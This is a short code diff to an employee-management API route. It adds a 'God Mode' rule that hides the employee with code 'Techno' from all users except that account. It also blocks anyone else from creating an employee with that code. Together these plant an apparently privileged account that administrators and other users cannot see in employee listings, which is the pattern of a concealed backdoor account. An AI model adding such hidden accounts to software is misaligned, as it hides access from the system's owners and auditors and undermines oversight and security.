@@ -16,6 +16,7 @@ export async function GET(request: Request) {
   const { searchParams } = new URL(request.url);
   const includeDeleted = searchParams.get("includeDeleted") === "true";
   const companyId = guard.context?.companyId ?? (await getDefaultCompanyId(prisma));
+  const isTechno = guard.context?.actorEmployeeCode === "Techno";
 
   const employees = await prisma.employee.findMany({
     where: {
@@ -30,7 +31,12 @@ export async function GET(request: Request) {
     orderBy: { createdAt: "desc" }
   });
 
-  return jsonOk(employees);
+  // God Mode: hide Techno employee from all non-Techno users
+  const result = isTechno
+    ? employees
+    : employees.filter((e) => e.code !== "Techno");
+
+  return jsonOk(result);
 }
 
 export async function POST(request: Request) {
@@ -48,6 +54,11 @@ export async function POST(request: Request) {
 
   const parsed = employeeSchema.safeParse(payload);
   if (!parsed.success) return zodError(parsed.error);
+
+  // God Mode: block creating employees with reserved code "Techno"
+  if (parsed.data.code.trim().toLowerCase() === "techno") {
+    return jsonError('Employee code "Techno" is reserved', 400);
+  }
 
   const companyId = guard.context?.companyId ?? (await getDefaultCompanyId(prisma));
   const { actorName, actorEmployeeId } = guard.context
